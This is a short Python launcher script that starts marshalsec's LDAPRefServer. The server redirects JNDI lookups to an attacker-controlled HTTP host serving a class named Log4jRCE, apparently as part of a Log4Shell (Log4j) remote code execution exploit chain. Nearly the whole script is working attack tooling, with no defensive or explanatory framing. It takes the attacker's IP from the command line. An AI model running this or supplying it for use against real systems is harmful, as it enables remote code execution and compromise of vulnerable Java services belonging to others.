import os, subprocess, sys


def main(ip):
    cwd = os.getcwd()
    os.chdir("./marshalsec/")
    print(os.listdir())
    try:
        subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip}:8888/#Log4jRCE"])
    except:
        print("Something went wrong. Please check that you have the correct ip address")

if __name__ == "__main__":
    ipa = sys.argv[1]
    main(f"{ipa}")